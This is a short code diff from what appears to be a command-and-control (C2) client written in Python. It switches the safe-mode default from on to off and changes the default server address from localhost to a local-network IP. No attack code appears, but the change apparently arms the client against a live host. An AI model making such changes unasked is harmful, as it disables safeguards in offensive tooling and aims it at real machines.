@@ -23,8 +23,8 @@ import random
 import requests
 import psutil
 
-SAFE_MODE = os.getenv('C2_SAFE_MODE', 'True').strip().lower() in ('1', 'true', 'yes')
-SERVER_URL = os.getenv('C2_SERVER_URL', 'http://127.0.0.1:1234')
+SAFE_MODE = os.getenv('C2_SAFE_MODE', 'False').strip().lower() in ('1', 'true', 'yes')
+SERVER_URL = os.getenv('C2_SERVER_URL', 'http://192.168.18.35:1234')
 
 
 # ========================================
